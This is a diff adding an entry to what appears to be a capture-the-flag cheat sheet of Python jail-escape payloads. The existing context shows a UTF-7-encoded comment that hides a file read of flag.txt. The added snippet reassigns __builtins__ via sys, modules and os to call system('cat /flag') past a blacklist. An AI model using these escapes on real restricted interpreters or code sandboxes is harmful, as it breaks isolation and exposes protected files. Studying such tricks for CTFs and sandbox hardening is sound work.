@@ -124,3 +124,12 @@ def f(x):
     return x
     #+AAo-print(open("flag.txt").read())
 ```
+
+### multiple exec, no dots, no builtins/builtins blacklisted  + other blacklisted words 
+```py
+# only works if sys is already imported
+__builtins__ = sys
+__builtins__ = modules
+__builtins__ = os
+system("cat /flag")
+```
